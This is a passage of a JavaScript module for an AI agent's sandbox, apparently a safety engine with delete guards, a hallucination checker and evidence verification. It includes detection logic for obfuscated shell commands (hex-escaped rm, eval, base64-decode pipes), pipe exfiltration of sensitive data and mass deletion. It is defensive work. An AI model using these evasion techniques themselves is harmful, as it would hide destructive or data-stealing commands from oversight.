/* METADATA
{
    "name": "zero_apex",
    "display_name": {
        "zh": "零·首席工程引擎",
        "en": "Zero Apex Engine"
    },
    "description": {
        "zh": "首席工程师执行引擎的真实运行时。防幻觉层/自检层/防删代码层/证据验证层全部为可执行代码，非文本。记忆走 Operit 真实持久化记忆库，开源搜索走真实 GitHub API，文件快照走真实文件系统。",
        "en": "The real runtime of the Zero Apex chief-engineer skill. Hallucination guard / self-awareness / file-delete guard / evidence verifier are all executable code. Memory uses Operit's real persistent memory library; open-source search hits the real GitHub API; file snapshots use the real filesystem."
    },
    "category": "Engineering",
    "enabledByDefault": false,
    "tools": [
        {
            "name": "preflight",
            "description": { "zh": "执行前综合门禁：整合自检层、防删代码层、防幻觉层、证据验证层，返回是否允许执行以及原因。", "en": "Pre-execution gate combining self-awareness, file-delete guard, hallucination guard and evidence verifier." },
            "parameters": [
                { "name": "goal", "description": { "zh": "用户目标/任务描述", "en": "User goal/task" }, "type": "string", "required": true },
                { "name": "command", "description": { "zh": "可选：即将执行的命令", "en": "Optional: the command about to run" }, "type": "string", "required": false },
                { "name": "evidence", "description": { "zh": "可选：已有证据文本（命令输出/日志等）", "en": "Optional: existing evidence text" }, "type": "string", "required": false },
                { "name": "files_read", "description": { "zh": "可选：是否已读取相关文件 true/false", "en": "Optional: whether relevant files were read" }, "type": "boolean", "required": false }
            ]
        },
        {
            "name": "file_guard",
            "description": { "zh": "防删代码层：分析命令或脚本内容，检测删除/覆盖/截断等破坏性操作，返回风险等级与是否需要用户确认。", "en": "File-delete guard: analyze a command or script for destructive operations." },
            "parameters": [
                { "name": "command", "description": { "zh": "要分析的命令", "en": "Command to analyze" }, "type": "string", "required": false },
                { "name": "script", "description": { "zh": "要扫描的脚本内容", "en": "Script content to scan" }, "type": "string", "required": false },
                { "name": "path", "description": { "zh": "要评估风险的路径", "en": "Path to assess risk" }, "type": "string", "required": false }
            ]
        },
        {
            "name": "hallucination_guard",
            "description": { "zh": "防幻觉层：检测文本中的确定性断言、编造引用、过度自信推测、无来源技术断言，判定置信度标签是否合法。", "en": "Hallucination guard: detect over-confident assertions, fabricated citations, and unlabeled claims." },
            "parameters": [
                { "name": "text", "description": { "zh": "要检测的输出文本", "en": "Text to check" }, "type": "string", "required": true },
                { "name": "evidence", "description": { "zh": "可选：支撑该文本的证据", "en": "Optional: supporting evidence" }, "type": "string", "required": false }
            ]
        },
        {
            "name": "evidence_check",
            "description": { "zh": "证据验证层：判断完成声明（已编译/已修复等）是否有真实证据支撑，返回验证等级 L0-L6。", "en": "Evidence verifier: judge whether a completion claim is backed by real evidence, returning level L0-L6." },
            "parameters": [
                { "name": "claim", "description": { "zh": "完成声明文本", "en": "Completion claim text" }, "type": "string", "required": true },
                { "name": "command", "description": { "zh": "可选：相关命令", "en": "Optional: related command" }, "type": "string", "required": false },
                { "name": "exit_code", "description": { "zh": "可选：命令退出码", "en": "Optional: command exit code" }, "type": "number", "required": false },
                { "name": "stdout", "description": { "zh": "可选：标准输出", "en": "Optional: stdout" }, "type": "string", "required": false },
                { "name": "stderr", "description": { "zh": "可选：标准错误", "en": "Optional: stderr" }, "type": "string", "required": false },
                { "name": "artifact_path", "description": { "zh": "可选：产物路径（如 APK），会真实检查是否存在", "en": "Optional: artifact path (e.g. APK), checked for real existence" }, "type": "string", "required": false }
            ]
        },
        {
            "name": "self_monitor",
            "description": { "zh": "自检层：评估当前工程六维状态（目标清晰/已读文件/证据就绪/不可逆风险/需确认/置信度），返回状态卡。", "en": "Self-awareness layer: assess six engineering meta-state dimensions and return a status card." },
            "parameters": [
                { "name": "goal", "description": { "zh": "当前目标", "en": "Current goal" }, "type": "string", "required": true },
                { "name": "goal_clear", "description": { "zh": "可选：目标是否清晰", "en": "Optional: whether the goal is clear" }, "type": "boolean", "required": false },
                { "name": "files_read", "description": { "zh": "可选：是否已读取相关文件", "en": "Optional: whether files were read" }, "type": "boolean", "required": false },
                { "name": "evidence_ready", "description": { "zh": "可选：证据是否就绪", "en": "Optional: whether evidence is ready" }, "type": "boolean", "required": false },
                { "name": "irreversible_risk", "description": { "zh": "可选：是否存在不可逆风险", "en": "Optional: whether there is irreversible risk" }, "type": "boolean", "required": false }
            ]
        },
        {
            "name": "output_firewall",
            "description": { "zh": "输出防火墙：检测思考过程泄漏、工具参数泄漏、废话抒情、超长代码块、乱码，返回违规清单。", "en": "Output firewall: detect thought leakage, tool-param leakage, filler, oversized code blocks and mojibake." },
            "parameters": [
                { "name": "text", "description": { "zh": "要检测的输出文本", "en": "Output text to check" }, "type": "string", "required": true }
            ]
        },
        {
            "name": "search_opensource",
            "description": { "zh": "真实开源搜索：调用 GitHub 搜索 API，按 Star 排序返回成熟仓库，用于先搜索再编码。", "en": "Real open-source search via GitHub API, sorted by stars, for search-before-code." },
            "parameters": [
                { "name": "keyword", "description": { "zh": "搜索关键词", "en": "Search keyword" }, "type": "string", "required": true },
                { "name": "language", "description": { "zh": "可选：语言过滤，如 kotlin/java/python", "en": "Optional: language filter" }, "type": "string", "required": false },
                { "name": "min_stars", "description": { "zh": "可选：最低 Star 数，默认 500", "en": "Optional: minimum stars, default 500" }, "type": "string", "required": false },
                { "name": "limit", "description": { "zh": "可选：返回条数，默认 5", "en": "Optional: result count, default 5" }, "type": "number", "required": false }
            ]
        },
        {
            "name": "remember",
            "description": { "zh": "写入真实持久化记忆：把任务的成功/失败经验写进 Operit 记忆库，可跨会话召回。", "en": "Write to the real persistent memory library." },
            "parameters": [
                { "name": "kind", "description": { "zh": "success 或 failure", "en": "success or failure" }, "type": "string", "required": true },
                { "name": "project", "description": { "zh": "项目名", "en": "Project name" }, "type": "string", "required": true },
                { "name": "summary", "description": { "zh": "经验摘要", "en": "Experience summary" }, "type": "string", "required": true },
                { "name": "evidence", "description": { "zh": "可选：证据（日志/路径等）", "en": "Optional: evidence" }, "type": "string", "required": false },
                { "name": "tech_stack", "description": { "zh": "可选：技术栈标签，逗号分隔", "en": "Optional: tech stack tags" }, "type": "string", "required": false }
            ]
        },
        {
            "name": "recall",
            "description": { "zh": "召回真实记忆：从 Operit 记忆库检索相关历史经验，返回匹配度排序结果。", "en": "Recall from the real persistent memory library." },
            "parameters": [
                { "name": "query", "description": { "zh": "检索关键词/问题", "en": "Query" }, "type": "string", "required": true },
                { "name": "kind", "description": { "zh": "可选：success/failure 过滤", "en": "Optional: success/failure filter" }, "type": "string", "required": false },
                { "name": "limit", "description": { "zh": "可选：返回条数，默认 5", "en": "Optional: limit, default 5" }, "type": "number", "required": false }
            ]
        },
        {
            "name": "snapshot_file",
            "description": { "zh": "防删代码的真实备份：把源文件复制到项目 .trash 快照目录（按时间戳命名），删除前必做。", "en": "Real backup for delete-guard: copy a source file into a timestamped .trash snapshot." },
            "parameters": [
                { "name": "path", "description": { "zh": "要备份的文件路径", "en": "File path to back up" }, "type": "string", "required": true }
            ]
        },
        {
            "name": "restore_file",
            "description": { "zh": "从 .trash 快照恢复文件（检测到误删时使用）。", "en": "Restore a file from the .trash snapshot." },
            "parameters": [
                { "name": "path", "description": { "zh": "原始文件路径", "en": "Original file path" }, "type": "string", "required": true },
                { "name": "snapshot_name", "description": { "zh": "可选：快照文件名，默认取最新", "en": "Optional: snapshot filename, defaults to latest" }, "type": "string", "required": false }
            ]
        }
    ]
}*/

// ==========================================================================
// zero_apex engine — Operit Sandbox (QuickJS) single-file module.
// No require(). External hooks (Network, Files, Tools, complete) injected
// at call time. Section map: see §0-§23 delimiters in body.
// ==========================================================================

const ZeroApex = (function () {
    "use strict";

    // ======================================================================
    // §0 ErrorCodes — enumerated, stable error identifiers
    // ======================================================================
    var ErrorCode = Object.freeze({
        OK: "OK",
        // 1xxx — input / validation
        INVALID_ARGUMENT: "E1001_INVALID_ARGUMENT",
        MISSING_REQUIRED: "E1002_MISSING_REQUIRED",
        INVALID_PATH: "E1003_INVALID_PATH",
        INVALID_KIND: "E1004_INVALID_KIND",
        // 2xxx — resource / IO
        FILE_NOT_FOUND: "E2001_FILE_NOT_FOUND",
        WRITE_FAILED: "E2002_WRITE_FAILED",
        READ_FAILED: "E2003_READ_FAILED",
        PATH_TRAVERSAL: "E2004_PATH_TRAVERSAL",
        // 3xxx — network / external
        NETWORK_ERROR: "E3001_NETWORK_ERROR",
        RATE_LIMITED: "E3002_RATE_LIMITED",
        PARSE_ERROR: "E3003_PARSE_ERROR",
        // 4xxx — guard / policy
        GUARD_BLOCK: "E4001_GUARD_BLOCK",
        HALLUCINATION_BLOCK: "E4002_HALLUCINATION_BLOCK",
        EVIDENCE_INSUFFICIENT: "E4003_EVIDENCE_INSUFFICIENT",
        TOOL_CURTAILED: "E4004_TOOL_CURTAILED",  // tool removed by manifest/env curtailment
        CONFIRMATION_REQUIRED: "E4005_CONFIRMATION_REQUIRED",  // risky op needs user confirmation
        // 5xxx — internal
        INTERNAL_ERROR: "E5001_INTERNAL_ERROR",
        DEPENDENCY_MISSING: "E5002_DEPENDENCY_MISSING",
    });

    // Human-readable Chinese message for each error code.
    // Used in audit logs and user-facing error messages so users don't
    // have to memorize E4001 etc.
    var ErrorCodeMessages = Object.freeze({
        OK: "成功",
        E1001_INVALID_ARGUMENT: "参数无效",
        E1002_MISSING_REQUIRED: "缺少必填参数",
        E1003_INVALID_PATH: "路径无效",
        E1004_INVALID_KIND: "类型参数无效",
        E2001_FILE_NOT_FOUND: "文件不存在",
        E2002_WRITE_FAILED: "文件写入失败",
        E2003_READ_FAILED: "文件读取失败",
        E2004_PATH_TRAVERSAL: "检测到路径穿越攻击",
        E3001_NETWORK_ERROR: "网络错误",
        E3002_RATE_LIMITED: "请求频率超限",
        E3003_PARSE_ERROR: "数据解析失败",
        E4001_GUARD_BLOCK: "守卫层拒绝执行",
        E4002_HALLUCINATION_BLOCK: "幻觉检测拦截",
        E4003_EVIDENCE_INSUFFICIENT: "证据不足以支撑声明",
        E4004_TOOL_CURTAILED: "工具在当前环境权限下不可用（被 manifest 裁剪）",
        E4005_CONFIRMATION_REQUIRED: "高风险操作需要用户确认后才可执行",
        E5001_INTERNAL_ERROR: "引擎内部错误",
        E5002_DEPENDENCY_MISSING: "缺少运行依赖（被 manifest 裁剪）",
    });

    function errorMessage(code, fallbackDetail) {
        var msg = ErrorCodeMessages[code];
        if (msg) return fallbackDetail ? (msg + "：" + fallbackDetail) : msg;
        return fallbackDetail || code || "未知错误";
    }

    // §0b META_TOOLS — the set of tool names that bypass permission/sandbox
    // checks. Defined ONCE here so that adding a new meta tool only requires
    // editing one place, not two parallel lists.
    // Why these are meta: they evaluate other tools (the authority), not the
    // subject. If they were subjected to permission/sandbox checks, they
    // would self-block.
    var META_TOOLS = Object.freeze({
        preflight: 1,
        evaluate_permission: 1,
        check_sandbox: 1,
        audit_log: 1,
        config_get: 1,
        config_set: 1,
    });
    function isMetaTool(name) { return META_TOOLS[name] === 1; }

    // ======================================================================
    // §2 ConfigRegistry — centralized config with validation
    // ======================================================================
    var ConfigRegistry = (function () {
        var store = {};
        var immutableKeys = {};  // keys that cannot be overwritten after lock
        var locked = false;

        // Security keys that are frozen after bootstrap
        var SECURITY_KEYS = [
            "file_guard.dangerous_commands",
            "file_guard.risky_paths",
            "file_guard.indirect_patterns",
            "file_guard.mass_delete_threshold",
            "output_firewall.tool_leak",
            "hallucination.fact_claims",
            "hallucination.overconfident_words",
        ];

        function register(key, value, validator) {
            if (typeof key !== "string" || !key) {
                throw new Error("ConfigRegistry: key must be non-empty string");
            }
            if (immutableKeys[key]) {
                throw new Error("ConfigRegistry: key '" + key + "' is immutable after lock");
            }
            if (validator) {
                var v = validator(value);
                if (v !== true && v !== undefined) {
                    throw new Error("ConfigRegistry: validation failed for '" + key + "': " + v);
                }
            }
            store[key] = value;
        }

        function get(key, fallback) {
            if (!(key in store)) {
                if (fallback !== undefined) return fallback;
                throw new Error("ConfigRegistry: missing key '" + key + "'");
            }
            return store[key];
        }

        function has(key) { return key in store; }

        // Lock security-critical keys so runtime config_set cannot overwrite them
        function lock() {
            if (locked) return;
            locked = true;
            for (var i = 0; i < SECURITY_KEYS.length; i++) {
                immutableKeys[SECURITY_KEYS[i]] = true;
            }
        }

        function isLocked() { return locked; }

        function snapshot() {
            var out = {};
            for (var k in store) { if (store.hasOwnProperty(k)) out[k] = store[k]; }
            return out;
        }

        function exportCfg() { return snapshot(); }

        return { register: register, get: get, has: has, snapshot: snapshot, export: exportCfg, lock: lock, isLocked: isLocked };
    })();

    // ======================================================================
    // §3 PathUtils — cross-platform path handling, no string concat
    // ======================================================================
    var PathUtils = (function () {
        var SEP = "/";

        function normalize(p) {
            var s = String(p || "");
            if (!s) return "";
            // Collapse multiple separators
            s = s.replace(/\/+/g, SEP);
            // Strip trailing slash (except root)
            if (s.length > 1 && s.charAt(s.length - 1) === SEP) {
                s = s.slice(0, -1);
            }
            return s;
        }

        function join() {
            var parts = [];
            for (var i = 0; i < arguments.length; i++) {
                var seg = String(arguments[i] || "");
                if (seg) parts.push(seg);
            }
            return normalize(parts.join(SEP));
        }

        function basename(p) {
            var s = normalize(p);
            var idx = s.lastIndexOf(SEP);
            return idx >= 0 ? s.slice(idx + 1) : s;
        }

        function dirname(p) {
            var s = normalize(p);
            var idx = s.lastIndexOf(SEP);
            if (idx <= 0) return idx === 0 ? SEP : "";
            return s.slice(0, idx);
        }

        function trashDir(p) {
            var dir = dirname(p);
            if (!dir) dir = ".";
            return join(dir, ".trash");
        }

        // Reject traversal patterns in user-supplied paths.
        function hasTraversal(p) {
            var s = String(p || "");
            return /(^|\/)\.\.($|\/)/.test(s);
        }

        return {
            SEP: SEP,
            normalize: normalize,
            join: join,
            basename: basename,
            dirname: dirname,
            trashDir: trashDir,
            hasTraversal: hasTraversal,
        };
    })();

    // ======================================================================
    // §4 RetryPolicy — exponential backoff + jitter
    // ======================================================================
    function RetryPolicy(opts) {
        opts = opts || {};
        var maxAttempts = opts.maxAttempts || 3;
        var baseDelayMs = opts.baseDelayMs || 400;
        var maxDelayMs = opts.maxDelayMs || 4000;
        var factor = opts.factor || 2;

        function delayFor(attempt) {
            var raw = baseDelayMs * Math.pow(factor, attempt - 1);
            if (raw > maxDelayMs) raw = maxDelayMs;
            // Jitter: +/- 20%
            var jit = raw * 0.2 * (Math.random() * 2 - 1);
            return Math.max(0, Math.round(raw + jit));
        }

        function shouldRetry(attempt, err) {
            if (attempt >= maxAttempts) return false;
            if (!err) return false;
            var msg = String(err.message || err);
            // Retry on transient network errors, not on 4xx client errors
            if (/40[13]/.test(msg)) return false;
            return true;
        }

        return { maxAttempts: maxAttempts, delayFor: delayFor, shouldRetry: shouldRetry };
    }

    // sleep helper that works in QuickJS (Promise + setTimeout)
    function sleep(ms) {
        return new Promise(function (resolve) {
            setTimeout(resolve, ms);
        });
    }

    // ======================================================================
    // §5 ConcurrencyLimiter — simple semaphore
    // ======================================================================
    function ConcurrencyLimiter(max) {
        var capacity = max || 1;
        var active = 0;
        var waiters = [];

        function acquire() {
            if (active < capacity) {
                active++;
                return Promise.resolve();
            }
            return new Promise(function (resolve) {
                waiters.push(resolve);
            });
        }

        function release() {
            active--;
            if (waiters.length > 0) {
                var next = waiters.shift();
                active++;
                next();
            }
        }

        function run(fn) {
            return acquire().then(function () {
                return Promise.resolve(fn()).then(function (r) {
                    release();
                    return r;
                }, function (e) {
                    release();
                    throw e;
                });
            });
        }

        return { acquire: acquire, release: release, run: run, _state: function () { return { active: active, waiting: waiters.length }; } };
    }

    // ======================================================================
    // §6 FileLock — in-memory per-path async mutex
    // ======================================================================
    function FileLock() {
        var locks = {};

        function acquire(path) {
            var key = PathUtils.normalize(path);
            if (!locks[key]) {
                locks[key] = { holders: 0, waiters: [] };
            }
            var entry = locks[key];
            if (entry.holders === 0) {
                entry.holders = 1;
                return Promise.resolve();
            }
            return new Promise(function (resolve) {
                entry.waiters.push(resolve);
            });
        }

        function release(path) {
            var key = PathUtils.normalize(path);
            var entry = locks[key];
            if (!entry) return;
            if (entry.waiters.length > 0) {
                var next = entry.waiters.shift();
                next();
            } else {
                entry.holders = 0;
            }
        }

        function withLock(path, fn) {
            return acquire(path).then(function () {
                return Promise.resolve(fn()).then(function (r) {
                    release(path);
                    return r;
                }, function (e) {
                    release(path);
                    throw e;
                });
            });
        }

        return { acquire: acquire, release: release, withLock: withLock };
    }

    // ======================================================================
    // §7 LRUCache — bounded LRU for recall / search caching
    // ======================================================================
    function LRUCache(capacity) {
        var cap = capacity || 32;
        var map = {};
        var order = [];

        function get(key) {
            if (!(key in map)) return undefined;
            // Move to front
            var idx = order.indexOf(key);
            if (idx >= 0) order.splice(idx, 1);
            order.push(key);
            return map[key];
        }

        function set(key, value) {
            if (key in map) {
                var idx = order.indexOf(key);
                if (idx >= 0) order.splice(idx, 1);
            }
            map[key] = value;
            order.push(key);
            while (order.length > cap) {
                var old = order.shift();
                delete map[old];
            }
        }

        function has(key) { return key in map; }
        function clear() { map = {}; order = []; }
        function size() { return order.length; }

        return { get: get, set: set, has: has, clear: clear, size: size };
    }

    // ======================================================================
    // §8 TemplateStore — externalized report templates
    // ======================================================================
    var TemplateStore = (function () {
        var templates = {};

        function register(name, tmpl) {
            if (typeof tmpl !== "string") throw new Error("Template must be string: " + name);
            templates[name] = tmpl;
        }

        function render(name, vars) {
            if (!templates[name]) throw new Error("Unknown template: " + name);
            var out = templates[name];
            vars = vars || {};
            for (var key in vars) {
                if (vars.hasOwnProperty(key)) {
                    out = out.split("{{" + key + "}}").join(String(vars[key]));
                }
            }
            return out;
        }

        function has(name) { return !!templates[name]; }

        // Built-in templates registered at load time
        register("status_card", "[自检] 就绪度 {{readiness}}/100 · 置信度 {{confidence}} · 因果链 {{causal}}{{blockers}}");
        register("preflight_card", "[门禁] 状态={{state}} · 置信度={{confidence}} · 就绪={{readiness}}{{gates}}{{reasons}}");
        register("gate_reason", "\n  - {{reason}}");

        return { register: register, render: render, has: has };
    })();

    // ======================================================================
    // §9 OutputChunker — segment large outputs
    // ======================================================================
    var OutputChunker = (function () {
        function chunk(text, maxBytes) {
            var s = String(text || "");
            var cap = maxBytes || 8192;
            if (s.length <= cap) return [s];
            var parts = [];
            var start = 0;
            while (start < s.length) {
                var end = Math.min(start + cap, s.length);
                // Try to break at a newline near the boundary
                if (end < s.length) {
                    var nl = s.lastIndexOf("\n", end);
                    if (nl > start + cap / 2) end = nl + 1;
                }
                parts.push(s.slice(start, end));
                start = end;
            }
            return parts;
        }

        function countLines(text) {
            var s = String(text || "");
            if (!s) return 0;
            return s.split("\n").length;
        }

        function truncate(text, maxChars, suffix) {
            var s = String(text || "");
            if (s.length <= maxChars) return s;
            return s.slice(0, maxChars) + (suffix || "…[truncated]");
        }

        return { chunk: chunk, countLines: countLines, truncate: truncate };
    })();

    // ======================================================================
    // §10 TaskLedger — priority task queue persisted to Files
    // ======================================================================
    function TaskLedger(deps) {
        var ledger = [];
        var seq = 0;

        function nextId() { return "T" + (++seq) + "_" + nowStamp(); }

        function enqueue(task) {
            var entry = {
                id: nextId(),
                goal: String(task.goal || ""),
                priority: task.priority || 0,
                status: "pending",
                created_at: new Date().toISOString(),
                payload: task.payload || {},
            };
            // Insert by priority (higher first), stable by seq
            var i = 0;
            for (; i < ledger.length; i++) {
                if (ledger[i].priority < entry.priority) break;
            }
            ledger.splice(i, 0, entry);
            return entry.id;
        }

        function next() {
            for (var i = 0; i < ledger.length; i++) {
                if (ledger[i].status === "pending") {
                    ledger[i].status = "running";
                    ledger[i].started_at = new Date().toISOString();
                    return ledger[i];
                }
            }
            return null;
        }

        // Valid state transitions. Guards prevent:
        // - complete() on pending (skipping running)
        // - complete() on already-completed
        // - next() running a done task
        var TRANSITIONS = {
            pending:   ["running", "cancelled"],
            running:   ["done", "failed", "cancelled"],
            done:      [],
            failed:    [],
            cancelled: [],
        };

        function canTransition(from, to) {
            var allowed = TRANSITIONS[from];
            if (!allowed) return false;
            return allowed.indexOf(to) >= 0;
        }

        function complete(id, result) {
            for (var i = 0; i < ledger.length; i++) {
                if (ledger[i].id === id) {
                    var cur = ledger[i].status;
                    if (!canTransition(cur, "done")) return false;
                    ledger[i].status = "done";
                    ledger[i].completed_at = new Date().toISOString();
                    ledger[i].result = result;
                    return true;
                }
            }
            return false;
        }

        function snapshot() {
            var out = [];
            for (var i = 0; i < ledger.length; i++) out.push(ledger[i]);
            return out;
        }

        function pendingCount() {
            var n = 0;
            for (var i = 0; i < ledger.length; i++) if (ledger[i].status === "pending") n++;
            return n;
        }

        return {
            enqueue: enqueue,
            next: next,
            complete: complete,
            snapshot: snapshot,
            pendingCount: pendingCount,
        };
    }

    // ======================================================================
    // §11 nowStamp / shared utilities
    // ======================================================================
    function nowStamp() {
        var d = new Date();
        var p = function (n) { return String(n).padStart(2, "0"); };
        return (
            d.getFullYear() +
            p(d.getMonth() + 1) +
            p(d.getDate()) +
            "_" +
            p(d.getHours()) +
            p(d.getMinutes()) +
            p(d.getSeconds())
        );
    }

    function safeString(v) {
        if (v === null || v === undefined) return "";
        if (typeof v === "string") return v;
        if (v && typeof v.message === "string") return v.message;
        if (v && typeof v.error === "string") return v.error;
        try { return String(v); } catch (e) { return "[unstringifiable]"; }
    }

    // §11b CommandNormalizer — decode obfuscation before pattern matching
    // Catches: \x72\x6d → rm, ${IFS}, $r$m, eval("rm"), base64 pipe, etc.
    // Pure function: no side effects, returns normalized string.
    // ======================================================================
    var CommandNormalizer = (function () {

        function decodeHexEscapes(s) {
            // \xHH → char
            return s.replace(/\\x([0-9a-fA-F]{2})/g, function (_, h) {
                try { return String.fromCharCode(parseInt(h, 16)); } catch (e) { return ""; }
            });
        }

        function decodeOctalEscapes(s) {
            // \NNN → char (3 octal digits)
            return s.replace(/\\([0-7]{1,3})/g, function (_, o) {
                var n = parseInt(o, 8);
                if (isNaN(n) || n > 255) return _;
                try { return String.fromCharCode(n); } catch (e) { return _; }
            });
        }

        function decodeUnicodeEscapes(s) {
            // \uHHHH → char
            return s.replace(/\\u([0-9a-fA-F]{4})/g, function (_, h) {
                try { return String.fromCharCode(parseInt(h, 16)); } catch (e) { return ""; }
            });
        }

        function resolveVarConcat(s) {
            // Pattern 1: $r$m style (single-char variables concatenated)
            // We mark as suspicious but cannot resolve without shell state.
            return { text: s, varConcat: /\$\{?\w\}?\$\{?\w\}?\$\{?\w\}?/.test(s) };
        }

        function resolveBacktickSubst(s) {
            // `cmd` → cmd (literal extraction only, no execution)
            return s.replace(/`([^`]+)`/g, "$1");
        }

        function resolveDollarParen(s) {
            // $(cmd) → cmd
            return s.replace(/\$\(([^)]+)\)/g, "$1");
        }

        function decodeBase64Segments(s) {
            // Detect | base64 -d patterns and flag (cannot decode without execution)
            return { text: s, base64Pipe: /base64\s+(-d|--decode)/i.test(s) };
        }

        function detectEvalCall(s) {
            // eval("...") or eval('...') patterns
            var m = s.match(/eval\s*\(\s*['"]([^'"]+)['"]/);
            if (m) return m[1];
            return null;
        }

        function normalize(cmd) {
            var text = safeString(cmd);
            if (!text) return { normalized: "", signals: [] };

            var signals = [];
            var cur = text;

            // Layer 1: literal escape decoding
            var before = cur;
            cur = decodeUnicodeEscapes(cur);
            cur = decodeHexEscapes(cur);
            cur = decodeOctalEscapes(cur);
            if (cur !== before) signals.push("escape_decoded");

            // Layer 2: command substitution unwrapping
            before = cur;
            cur = resolveBacktickSubst(cur);
            cur = resolveDollarParen(cur);
            if (cur !== before) signals.push("substitution_unwrapped");

            // Layer 3: detect eval() with literal arg, expand it
            var evalArg = detectEvalCall(cur);
            if (evalArg) {
                cur = cur + " " + evalArg;
                signals.push("eval_expanded");
            }

            // Layer 4: var concat detection (cannot resolve, just signal)
            var vc = resolveVarConcat(cur);
            if (vc.varConcat) signals.push("var_concat_suspicious");

            // Layer 5: base64 pipe detection
            var b64 = decodeBase64Segments(cur);
            if (b64.base64Pipe) signals.push("base64_pipe_suspicious");

            return { normalized: cur, signals: signals };
        }

        return { normalize: normalize };
    })();

    // ======================================================================
    // §12 FileGuard — delete/overwrite detection
    // Patterns sourced from ConfigRegistry; allowlist mode available.
    // ======================================================================
    var FileGuard = (function () {
        function patterns() {
            return ConfigRegistry.get("file_guard.delete_patterns", []);
        }
        function indirectPatterns() {
            return ConfigRegistry.get("file_guard.indirect_patterns", []);
        }
        function riskyPaths() {
            return ConfigRegistry.get("file_guard.risky_paths", []);
        }

        function analyzeCommand(cmd) {
            // Layer 0: normalize (decode obfuscation) before pattern matching
            var norm = CommandNormalizer.normalize(cmd);
            var text = norm.normalized;
            var hits = [];
            var requiresConfirmation = false;
            var isDelete = false;
            var suspiciousSignals = norm.signals.slice();

            // If signals indicate obfuscation, require confirmation by default
            if (suspiciousSignals.length > 0) {
                requiresConfirmation = true;
                for (var si = 0; si < suspiciousSignals.length; si++) {
                    hits.push({
                        pattern: "obfuscation:" + suspiciousSignals[si],
                        desc: "检测到命令混淆: " + suspiciousSignals[si] + "（原始: " + safeString(cmd).slice(0, 60) + "）",
                        soft: false,
                    });
                }
            }

            var plist = patterns();
            for (var i = 0; i < plist.length; i++) {
                var p = plist[i];
                if (p.re.test(text)) {
                    if (p.soft && /\/dev\/null/.test(text)) continue;
                    hits.push({ pattern: p.name, desc: p.desc, soft: !!p.soft });
                    if (!p.soft) isDelete = true;
                    requiresConfirmation = true;
                }
            }

            var pathRisks = [];
            // Bug#7 fix: extract paths from both quoted and unquoted contexts.
            // Order: double-quoted, single-quoted, unquoted (stop at shell metachar)
            var pathMatches = [];
            var pathSeen = {};
            var rePatterns = [
                /"(\/[^"]+)"/g,       // double-quoted: "/path/with spaces/file"
                /'(\/[^']+)'/g,       // single-quoted: '/path/with spaces/file'
                /(\/[^\s"'|&;><]+)/g, // unquoted: /path/file (original)
            ];
            for (var rpi = 0; rpi < rePatterns.length; rpi++) {
                var rm;
                var re = rePatterns[rpi];
                re.lastIndex = 0;
                while ((rm = re.exec(text)) !== null) {
                    var p = rm[1] || rm[0];
                    if (!pathSeen[p]) { pathSeen[p] = true; pathMatches.push(p); }
                }
            }
            var rplist = riskyPaths();
            // Detect write-class commands for writeOnly path entries
            var isWriteCmd = isDelete || /^\s*(cp|mv|scp|rsync|tee|dd|install|touch|chmod|chown|ln|mkfifo|mknod|truncate|cat\s+>|echo\s+>)/i.test(text);
            for (var mi = 0; mi < pathMatches.length; mi++) {
                for (var ri = 0; ri < rplist.length; ri++) {
                    if (rplist[ri].re.test(pathMatches[mi])) {
                        // writeOnly entries only trigger on write/delete commands
                        if (rplist[ri].writeOnly && !isWriteCmd && !requiresConfirmation) continue;
                        pathRisks.push({ path: pathMatches[mi], why: rplist[ri].why });
                        requiresConfirmation = true;
                    }
                }
            }

            // §21e ShellGuard enhancement: dangerous command + read-only chain
            var sg = ShellGuard.analyze(cmd);
            var sgReasons = [];
            if (sg.dangerous_hits && sg.dangerous_hits.length > 0) {
                for (var di = 0; di < sg.dangerous_hits.length; di++) {
                    var dhit = sg.dangerous_hits[di];
                    var prim = dhit.primary || "";
                    hits.push({
                        pattern: "dangerous:" + prim,
                        desc: "危险命令: " + prim + " [" + dhit.segment + "]",
                        soft: false,
                    });
                    if (prim === "rm" || prim === "rmdir" || prim === "unlink" || prim === "shred") {
                        isDelete = true;
                    }
                }
                requiresConfirmation = true;
                sgReasons = sg.reasons.slice();
            } else if (sg.unsafe_token) {
                hits.push({
                    pattern: "unsafe_token:" + sg.unsafe_token,
                    desc: "含不可检查的 shell 构造: " + sg.unsafe_token,
                    soft: false,
                });
                requiresConfirmation = true;
                sgReasons.push("含不可检查的 shell 构造: " + sg.unsafe_token);
            }
            // Pure read-only chain with no other risk: downgrade to LOW/no-confirm
            var noOtherRisk = hits.length === 0 && pathRisks.length === 0;
            if (sg.all_read_only && noOtherRisk) {
                requiresConfirmation = false;
            }

            var result = buildRiskResult(isDelete, requiresConfirmation, hits, pathRisks);
            for (var sr = 0; sr < sgReasons.length; sr++) {
                if (result.reasons.indexOf(sgReasons[sr]) < 0) {
                    result.reasons.push(sgReasons[sr]);
                }
            }
            // Bump level if dangerous hits present
            if (sg.dangerous_hits && sg.dangerous_hits.length > 0) {
                if (result.risk_level === "LOW" || result.risk_level === "MEDIUM") {
                    result.risk_level = isDelete ? "CRITICAL" : "HIGH";
                }
            }
            // §22: surface chain-level pipe exfiltration + mass delete findings.
            // These are independent of per-segment analysis: per-segment looks safe,
            // but the chain as a whole is destructive / exfiltrating.
            if (sg.pipe_exfiltration) {
                result.pipe_exfiltration = sg.pipe_exfiltration;
                if (sg.pipe_exfiltration.sensitiveSource) {
                    result.reasons.push("数据外泄: 敏感源 [" + sg.pipe_exfiltration.sensitiveSource + "] 通过管道传出");
                } else {
                    result.reasons.push("数据外泄: 含外发目标 [" + sg.pipe_exfiltration.sink + "]");
                }
                // Pipe exfiltration is always CRITICAL
                result.risk_level = "CRITICAL";
                result.requires_confirmation = true;
                result.hits.push({
                    pattern: "pipe-exfil:" + sg.pipe_exfiltration.pattern,
                    desc: "管道数据外泄: " + (sg.pipe_exfiltration.chain || "").slice(0, 80),
                    soft: false,
                });
            }
            if (sg.mass_delete) {
                result.mass_delete = sg.mass_delete;
                result.reasons.push("批量删除: " + sg.mass_delete.pattern + " [" + (sg.mass_delete.chain || "").slice(0, 80) + "]");
                result.risk_level = "CRITICAL";
                result.requires_confirmation = true;
                result.hits.push({
                    pattern: "mass-delete:" + sg.mass_delete.pattern,
                    desc: "批量删除模式: " + sg.mass_delete.pattern,
                    soft: false,
                });
                isDelete = true;
            }
            result.is_delete = isDelete;
            return result;
        }

        function scanScript(content) {
            var text = safeString(content);
            var hits = [];
            var isDelete = false;
            var iplist = indirectPatterns();
            for (var i = 0; i < iplist.length; i++) {
                if (iplist[i].test(text)) {
                    isDelete = true;
                    var m = text.match(iplist[i]);
